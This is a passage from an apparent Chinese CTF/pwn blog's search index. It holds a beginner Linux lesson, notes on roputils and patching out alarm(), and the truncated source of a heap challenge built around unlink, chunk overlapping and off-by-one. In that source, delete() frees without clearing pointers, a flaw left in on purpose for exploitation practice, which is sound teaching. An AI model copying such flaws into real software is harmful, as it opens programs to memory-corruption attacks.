<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Linux基础</title>
    <link href="/2021/08/07/linux%E5%9F%BA%E7%A1%80/"/>
    <url>/2021/08/07/linux%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="linux基础"><a href="#linux基础" class="headerlink" title="linux基础"></a><font color=#86473F>linux基础</font></h1><p><font color=#BF6766>这节课的目的：</font></p><ul><li>让没有任何编程基础的萌新了解linux系统</li><li>大致了解linux最基本文件操作指令以及软件的下载安装</li></ul><p><font color=#BF6766>并没有很多的指令的学习，主要是想为萌新们加深对于linux系统的理解。以及讲一些个人的比较奇怪的体会</font></p><h2 id="1）linux是什么？"><a href="#1）linux是什么？" class="headerlink" title="1）linux是什么？"></a><font color=#B19693>1）linux是什么？</font></h2><p>Linux是一类自由和开源的操作系统。</p><p>通常情况下，我们接触到的linux都是被打包好的各种linux发行版，包括<a href="https://zh.wikipedia.org/wiki/Debian">Debian</a>（<font color=#A96360>及其派生版本<a href="https://zh.wikipedia.org/wiki/Ubuntu">Ubuntu</a>、Kali等</font>）、<a href="https://zh.wikipedia.org/wiki/Fedora">Fedora</a>（<font color=#A96360>及其相关版本<a href="https://zh.wikipedia.org/wiki/CentOS">CentOS</a>和<a href="https://zh.wikipedia.org/wiki/OpenSUSE">openSUSE</a>等。)</font></p><p>也就是类似ubuntu，centos等操作系统，都属于linux。不同的发行版的命令格式以及依赖库都不太一样，在学习初期选择一种发行版使用就行，没有必要反复横跳。</p><p>如果你立志学习web安全，那么可以学习kali，二进制安全则是ubuntu，运维的话似乎用centos的人比较多。</p><h2 id="2）为什么要使用linux？"><a href="#2）为什么要使用linux？" class="headerlink" title="2）为什么要使用linux？"></a><font color=#B19693>2）为什么要使用linux？</font></h2><h3 id="1）免费"><a href="#1）免费" class="headerlink" title="1）免费"></a><font color=#AB3B3A>1）免费</font></h3><p>windoe10家庭版在中国官网售价<strong>1088rmb</strong>，Mac OS X正版则只随电脑附赠，最便宜的是mac mini，<strong>5299</strong>起。</p><p><strong>然而作为三大操作系统之一的linux，完全免费</strong>（<font color=#A96360><a href="http://haacked.com/archive/2012/02/22/spirit-of-open-source.aspx/">关于开源协议以及开源精神</a></font>）</p><h3 id="2）开源"><a href="#2）开源" class="headerlink" title="2）开源"></a><font color=#AB3B3A>2）开源</font></h3><p>开源意味着用户可以对linux 内核进行查看甚至修改，例如对于linux服务器来说，用户甚至可以自定义系统程序，为管理提供了便利。</p><p>另一方面，内核开源使得我们有机会去分析内核代码，使得源码剖析成为可能。（在ctf pwn方向，完全开源的内核代码为glibc pwn以及kernel pwn学习提供了极大的便利）</p><h3 id="3）软件生态丰富"><a href="#3）软件生态丰富" class="headerlink" title="3）软件生态丰富"></a><font color=#AB3B3A>3）软件生态丰富</font></h3><p>对于很多我们熟悉的桌面版软件（QQ，WX等），linux一众发行版的适配可以说是非常糟糕。比如你可能需要费非常大的力气才能在liunx上跑一个bug很多，ui很奇怪的qq。</p><p>但是对于SRE的日常学习来说，linux是必不可少的。我们使用的非常多的程序基本都是原生支持linux而不一定支持其他操作系统，也就意味着可能在Linux上能顺利运行，在win或者macosx上就会出现很多奇怪的bug，或者根本就不支持。并且，承接上文说到的开源，开源且自由的环境让服务器状态几乎变得透明，我们可以很方便地进行服务器的管理，~~也希望同学们能多学习一点运维知识，就算以后不干这行也很有用，毕竟运维安全部，运维也是大头嘛。</p><h3 id="4）ctf学习"><a href="#4）ctf学习" class="headerlink" title="4）ctf学习"></a><font color=#AB3B3A>4）ctf学习</font></h3><p>接上一点，Linux基本上是学习ctf竞赛道路中必备的工具，正确熟练地使用linux能使你学习效率大大提高。</p><p>传说“kali学得好，牢饭少不了”，作为linux发行版其一的kali拥有超过600个预装的渗透测试程序，为不管是打ctf还是实战都提供了极大的便利。美剧Mr.robot中，男主就是靠一台kali打四方，其标志性的龙图标在剧中非常惹人注目。</p><h2 id="3）安装一个linux系统"><a href="#3）安装一个linux系统" class="headerlink" title="3）安装一个linux系统"></a><font color=#B19693>3）安装一个linux系统</font></h2><p>这个应该上课前就要安装吧。</p><p>我就不再重新装了，但是有几点需要注意。</p><p>首先学习二进制的同学一般来说是装ubuntu，学web安全的同学可以装kali，运维好像选择centos的比较多/</p><p>然后就是关于某个发行版的具体版本。在官网上可以看到ubuntu大致分为后缀的普通版和LTS（long term support）版本，建议直接装lts版本。</p><p>然后是具体的版本号</p><p>一般来说装最新版本的lts是不会出什么大问题的，不同的版本主观体验上差别基本就是ui和glibc。</p><p>前者换个主题就搞定了，后者的话基本只在做pwn题时才能感受到。所以影响不大。</p><p>下载好系统镜像文件后基本就是傻瓜式操作了，看看网上的文章照着操作就完事。<del>如果是用Parallel Desktop的同学装系统碰到问题不能解决的话可以问我，vm我也不会·（）。</del></p><p>如果在物理机和虚拟机之间的交互上出了问题，尽量先在网上查一查。我也没有用过vm虚拟机。。不太清楚怎么搞。</p><p>还有一点要吐槽，ubuntu官网那个下载界面真的好怪</p><p>就是这个界面，好怪，这还是中文站，设计得好像只有四个版本。结果是要点那个桌面系统进去。</p><p><img src="/Users/rin/blog/source/iamge/ubuntu%E5%AE%98%E7%BD%91.png" alt="ubuntu官网"></p><h2 id="4）linux基础知识及常见命令"><a href="#4）linux基础知识及常见命令" class="headerlink" title="4）linux基础知识及常见命令"></a><font color=#B19693>4）linux基础知识及常见命令</font></h2><p><strong>事实上这个东西就和记英文单词一样，没有必要记。用得多了自然就熟了，特别生僻的直接查就好了。所以我觉得学习初期记一些简单的命令就行。</strong></p><h4 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a><font color=#AB3B3A>文件管理</font></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>ls  <span class="hljs-comment">#列举出当前工作目录的内容（文件或文件夹）</span><br>  <br><span class="hljs-built_in">cd</span>  <span class="hljs-comment">#切换文件路径</span><br>    <br>mkdir  <span class="hljs-comment">#新建文件夹</span><br>  <br><span class="hljs-built_in">pwd</span> <span class="hljs-comment">#显示当前工作目录</span><br>  <br>rm  <span class="hljs-comment">#删除指定文件</span><br>  <br></code></pre></td></tr></table></figure><p>如果你在搜索引擎中搜索linux文件管理基本命令，你会发现无论哪个文章，里面的指令介绍都有至少二十条。这还不包括指令的各种参数的列举。</p><p>那么为什么我只列出了5条呢？<br>最主要的原因是我认为指令是根据自己需要来学习的，并且这种东西不存在理解的难度，网上指令大全一大把，如果碰到不知道的指令直接Google然后记住就好了。</p><p>其次就我个人来说二进制学习并不需要什么太过复杂的指令，记这些不如去记gdb的调试指令（）。</p><p>再其次就是感觉大家大多数还是在用桌面版，桌面版的话ubuntu直接为文件管理提供了图形化界面，比较友好直观。像win那样操作就好了，但是如果是linux server就没办法啦。（好怪，不会真的有人拿云服务器学ctf吧）</p><h4 id="安装-更新-包管理"><a href="#安装-更新-包管理" class="headerlink" title="安装/更新/包管理"></a><font color=#AB3B3A>安装/更新/包管理</font></h4><p>在了解相关指令之前，必须明确一个概念就是，抛开ubuntu贫瘠的应用市场不谈。ubuntu等一众发行版下载/安装程序基本都是通过shell来交互。</p><p>也就是ubuntu下载某个程序，一般来说不是到某个应用市场下载安装包再一键安装（当然也行），而是通过<font color=#86473F>储存库 -&gt; 包管理器 -&gt;用户</font>的路径对软件包进行分发。</p><p>比如我们要下载vim这个代码编辑器，只需要一条简单的指令就能实现自动下载和安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt install vim<br></code></pre></td></tr></table></figure><p>这里<code>sudo</code>表示以管理员身份指令后面的指令，如果你执行某条指令时报错了，不要慌张。认真看后面的报错的信息，（ps：如果使用的是ubuntu20.04，那么你可以调成中文，非常萌新友好）</p><p><code>apt</code>则是ubuntu中的一个包管理器，可以自动下载，配置，安装二进制或者源代码格式的软件包。</p><p>类似apt的包管理还有很多，ubuntu上就有特别常用的pip，npm之类，</p><p><code>install</code>则是具体的指令，类似的还有<code>remove</code>，<code>update</code>，<code>upgrade</code>等。</p><p>我们还忽略了一个叫储存库的东西，它比较大众的名字是“软件源”，负责储存各种软件下载的路径。</p><p>![截屏2021-08-07 上午11.17.05](/Users/rin/blog/source/iamge/截屏2021-08-07 上午11.17.05.png)</p><p>比如说这里。</p><p>Do you want to continue？</p><p>当我们选择yes，apt就开始自动从<code>http://cn.archive.ubuntu.com/ubuntu bionic-updates/main amd64 vim-runtime all</code>这个网址下载vim的安装包，这个网址就可以理解为是一个软件源。</p><p>就像在手机上下载软件，有app store。软件源就类似app store，然后你需要通过包管理器将软件源上的东西下载并安装到本地。</p><p>当然软件源是可以更换的，由于国内不能科学上网，如果用默认的源下载速度一般会很慢。推荐更换清华或者阿里源。</p><p>具体的换源教程建议百度。</p><p>然后列举一些最基本的指令，具体的指令实际上不用记住，只要知道有这么个东西，它大致是干什么的就行。以后遇到了再学习也不会迟。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#apt</span><br>sudo apt update  <span class="hljs-comment">#查看可新的软件包</span><br>sudo apt upgrate  <span class="hljs-comment">#更新软件包</span><br>sudo apt remove  <span class="hljs-comment">#删除某个通过apt下载安装的软件包</span><br><br><span class="hljs-comment">#dpkg</span><br>dpkg -i package.deb     <span class="hljs-comment">#安装包</span><br>dpkg -r package         <span class="hljs-comment">#删除包</span><br><span class="hljs-comment">#dpkg也是包管理工具，但是一般来说用于处理本地下载好的包，就是从网上下载好deb文件，然后通过dpkg安装。</span><br><br></code></pre></td></tr></table></figure><p>还要注意的就是以后大家会遇到要安装pip的情况。</p><p>pip是一个专门处理基于python语言程序的包管理器。但是一般来说ubuntu18及以上都是默认支持python3的，所以相对应的pip也应该安装pip3。具体的安装方法可自寻文章。</p><h2 id="5）linux学习心得"><a href="#5）linux学习心得" class="headerlink" title="5）linux学习心得"></a><font color=#B19693>5）linux学习心得</font></h2><p>在熟练掌握最基础命令+善用搜素引擎之后，你已经能初步操作linux做你想做的事情了。</p><p>但是上文中我也一直说在授课中我不想讲太多纯粹的指令。这些东西应该在课后自己折腾。就算课上讲了，有一说一一会儿就忘了。</p><p>但是就“如何学习（或者记住）命令”这个问题，我认为还是有一定的窍门的，并不是纯粹的熟能生巧。</p><p>比如一般通过萌新大概会对代码有天然的恐惧，给他一篇再清楚再详细的文章，也可能报错连连。犯诸如打错字，复制别人的用户名，行号等等。由于这种对于自己看不懂的东西天生的抵触，他可能在很长一段时间里都只是纯粹地对教程上的指令进行复制粘贴，而不去探究，哪怕只是搜一下，这个命令为什么是这样的，这个pip和pip3有什么区别等等。</p><p>所以我希望大家在学习某一条指令的时候，尽量先把每一条指令拆分开来，分别查对应的功能或者意思。</p><p>就比如我在前面写到的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt install vim<br></code></pre></td></tr></table></figure><p>在新人眼里这就是一串英文字母，但是沉下心来你会发现它由四个部分组成，具体的前文已经分析过了。</p><p>然后你会逐渐发现这些指令都有共通的地方，学会了一条“语法”，就相当于学会了成百上千条指令。</p><p>同时明白了指令的原理也能让你随机应变，找到你自己环境的差异然后有针对性的对指令进行修改。</p><p>linux系统更加深奥的部分，将会由别的学姐在之后的课程中带领大家深入。希望下面简单的课后作业能使大家充满决心！</p><h2 id="7）课后作业"><a href="#7）课后作业" class="headerlink" title="7）课后作业"></a><font color=#B19693>7）课后作业</font></h2><h4 id="Level0"><a href="#Level0" class="headerlink" title="Level0 "></a><font color=#AB3B3A>Level0 </font></h4><p>利用（linux自带的）gcc编译器通过指令编译一个<code>hello world</code> c程序。</p><p>（ps：程序的源码不会写的话直接网上复制，不过hello world这种程度的代码建议花十分钟学一学）</p><h4 id="Level1"><a href="#Level1" class="headerlink" title="Level1 "></a><font color=#AB3B3A>Level1 </font></h4><p>使用gdb调试你的hello world程序，感受单步调试的神圣感，将你看到的东西记在心里，也许以后会用上。</p><h4 id="Level2"><a href="#Level2" class="headerlink" title="Level2 "></a><font color=#AB3B3A>Level2 </font></h4><p><strong><font color=#9F353A>夹带私货环节，不想学pwn的同学可以直接跳过。 </font></strong></p><p>利用pip3安装一个pwntools。</p><h2 id="8）参考"><a href="#8）参考" class="headerlink" title="8）参考"></a><font color=#B19693>8）参考</font></h2><p>鸟哥的Linux私房菜</p><p><a href="http://haacked.com/archive/2012/02/22/spirit-of-open-source.aspx/">What Is The Spirit of Open Source?</a></p><p><a href="https://www.runoob.com/linux/linux-comm-apt.html">Linux apt 命令</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>mess</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>roputils使用tips</title>
    <link href="/2021/08/03/roputils/"/>
    <url>/2021/08/03/roputils/</url>
    
    <content type="html"><![CDATA[<p>做ret2dl的时候难免会偷懒使用工具。</p><p>但是这个工具并没有看起来那么和善。</p><p>就怎么使用utils包我都研究了一会儿，然后发现只需要<code>import roputils</code>然后把相对应的那个py脚本放到同一路径下就好。</p><p>但是紧接着第二问个问题，这个py脚本通篇是python2，而我日常无论哪个系统都是py3。</p><p>所以解决方式有2</p><ol><li> 将roputils转换为py3</li><li>ubuntu切换py版本</li></ol><p>反正第一种就是用一个叫2to3的脚本。是py2自带的，使用需要先安装py2.7，我ubuntu18.04自带py2.7，所以就直接<code>2to3 -w roputils.py</code></p><p>具体参数可以google。</p><p>然后又来了第三个问题。</p><p>来看我的报错。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">[+] Starting local process <span class="hljs-string">&#x27;./babystack&#x27;</span>: pid <span class="hljs-number">745</span><br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;babystack.py&quot;</span>, line <span class="hljs-number">23</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>    rop = roputils.ROP(<span class="hljs-string">&#x27;./babystack&#x27;</span>)<br>  File <span class="hljs-string">&quot;/home/fur1n/pwn/week1/roputils.py&quot;</span>, line <span class="hljs-number">440</span>, <span class="hljs-keyword">in</span> __init__<br>    ELF.__init__(self, *args, **kwargs)<br>  File <span class="hljs-string">&quot;/home/fur1n/pwn/week1/roputils.py&quot;</span>, line <span class="hljs-number">85</span>, <span class="hljs-keyword">in</span> __init__<br>    m = re.search(<span class="hljs-string">r&#x27;^\s*(?P&lt;key&gt;[^:]+):\s+(?P&lt;value&gt;.+)$&#x27;</span>, line)<br>  File <span class="hljs-string">&quot;/usr/lib/python3.6/re.py&quot;</span>, line <span class="hljs-number">182</span>, <span class="hljs-keyword">in</span> search<br>    <span class="hljs-keyword">return</span> _<span class="hljs-built_in">compile</span>(pattern, flags).search(string)<br>TypeError: cannot use a string pattern on a <span class="hljs-built_in">bytes</span>-like <span class="hljs-built_in">object</span><br></code></pre></td></tr></table></figure><p>这个功能好像并不会在byte前加b。。。</p><p>目前来说并没有发现解决方法。</p><p>所以只能尝试更换默认的py版本。具体可以google</p>]]></content>
    
    
    
    <tags>
      
      <tag>mess</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>patch&#39;alarm</title>
    <link href="/2021/08/03/patch%20alarm/"/>
    <url>/2021/08/03/patch%20alarm/</url>
    
    <content type="html"><![CDATA[<p>比较弱智的一个操作，但是如果没注意到的话还是有一点点坑。</p><p>一般来说许多题都喜欢在main函数里加alarm。</p><p>alarm会导致调试的时候超时，如果没有解决的话基本不能调试。算最基础的的反调试手法了。</p><p>ps:关于超时的那个报错当时还好好研究了一会儿来着。就是一个sigxxx，sigalarm好像，然后默认返回中止程序。</p><p>解决方案也比较弱智。就是直接patch掉就好了。</p><p>ida都关了懒得上图了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>mess</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SummerTask</title>
    <link href="/2021/08/02/summertask/"/>
    <url>/2021/08/02/summertask/</url>
    
    <content type="html"><![CDATA[<h1 id="1）Summer-Havard"><a href="#1）Summer-Havard" class="headerlink" title="1）Summer_Havard"></a>1）Summer_Havard</h1><h2 id="1-考点"><a href="#1-考点" class="headerlink" title="1) 考点"></a>1) 考点</h2><p>unlink</p><p>chunk overlapping</p><p>off by one/null</p><h2 id="2）源码"><a href="#2）源码" class="headerlink" title="2）源码"></a>2）源码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_IDX 100<span class="hljs-comment">//the maximum number of songs which can be created</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_SIZE 9999<span class="hljs-comment">//the maximum size of your chunk</span></span><br><span class="hljs-comment">//#define MAGICAL_IDX rand()%1000 // MAGICAL_IDX is a randow number in range of 0 - 1000.</span><br><span class="hljs-comment">//#define MAGICAL_IDX 2 // MAGICAL_IDX is a randow number in range of 0 - 1000.</span><br><br><span class="hljs-comment">//int MAGIC_NAME =  831;//the name of the target song to getshell</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">song</span> // <span class="hljs-title">create</span> <span class="hljs-title">the</span> <span class="hljs-keyword">struct</span> <span class="hljs-title">of</span> <span class="hljs-title">song</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-keyword">char</span> *name; <span class="hljs-comment">//the name of the song</span><br>  <span class="hljs-keyword">size_t</span> size;<span class="hljs-comment">//the size of the song</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">song</span> *<span class="hljs-title">songlist</span>[<span class="hljs-title">MAX_IDX</span>];</span><span class="hljs-comment">//set the max number of the songs</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">menu</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;|----------------------------|&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;|         MY_PLAYER          |&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;|----------------------------|&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;|1.DOWNLOAD THE SONG         |&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;|2.DELETE THE SONG           |&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;|3.LISTENING                 |&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;|4.EDIT THE NAME OF THE SONG |&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;|5.EXIT                      |&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;|6.PWNED                     |&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;|----------------------------|&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;|            ∧ ___ ∧         |&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;|           / ●   ● |        |&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;|          /    -   |        |&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;|----------------------------|&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">download</span><span class="hljs-params">()</span> <span class="hljs-comment">//add a new heap includeing a size chunk and content chunk.</span></span><br><span class="hljs-function"></span>&#123; <span class="hljs-keyword">int</span> i;<br>  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">8</span>];<span class="hljs-comment">//the buffer of the read func .</span><br>  <span class="hljs-keyword">size_t</span> size;<span class="hljs-comment">//the size of the chunk.</span><br>  <span class="hljs-keyword">if</span> (MAX_IDX &gt; <span class="hljs-number">100</span>) <span class="hljs-comment">//set the range .</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot; MEMORY EXCESSIVE LOAD &quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAX_IDX; i++)<span class="hljs-comment">//init the struct heap.</span><br>  &#123;<br>    <span class="hljs-keyword">if</span> (!songlist[i]) <br>    &#123;<br>      songlist[i] = (struct song *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(struct song));<br>      <span class="hljs-keyword">if</span> (!songlist[i])<br>       &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;ALLOCA ERROR&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>       &#125; <span class="hljs-comment">//error</span><br>  <br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SIZE OF THE SONG :&quot;</span>);<br>      <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%ld&quot;</span>,&amp;size);<br>      <span class="hljs-keyword">if</span> (size &gt; <span class="hljs-number">0</span> &amp;&amp; size &lt; MAX_SIZE)<br>      &#123;<br>        songlist[i]-&gt;name = (<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">malloc</span>(size);<span class="hljs-comment">//add a chunk to store the struct &#x27;size&#x27; .</span><br>      <span class="hljs-keyword">if</span> (!songlist[i]-&gt;name) <br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;ALLOCA ERROR&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>      &#125;<span class="hljs-comment">//error</span><br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NAME :&quot;</span>);<br>      read(<span class="hljs-number">0</span>,songlist[i]-&gt;name,size);<br>      <span class="hljs-comment">//scanf(&quot;%c&quot;,&amp;(songlist[i]-&gt;name));</span><br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;DOWNLOAD SUCCESFULLY&quot;</span>);<br>      <span class="hljs-keyword">break</span>;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;(INVALID SIZE)\n&quot;</span> );<br>        <span class="hljs-keyword">break</span>;<br>      &#125;<br>      <br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">delete</span><span class="hljs-params">()</span><span class="hljs-comment">//delete</span></span><br><span class="hljs-function"></span>&#123; <br>  <span class="hljs-keyword">int</span> idx;<br>  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">4</span>];<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;INDEX :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4</span>);<br>  idx = atoi(buf);<br>  <span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">0</span> || idx &gt;= <span class="hljs-number">100</span>) <br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;INVALID INDEX!!!&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> (songlist[idx]) <br>  &#123;<br>    <span class="hljs-built_in">free</span>(songlist[idx]-&gt;name);<br>    <span class="hljs-built_in">free</span>(songlist[idx]);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;DELETE SUCCESFULLY&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>    &#123;<br>    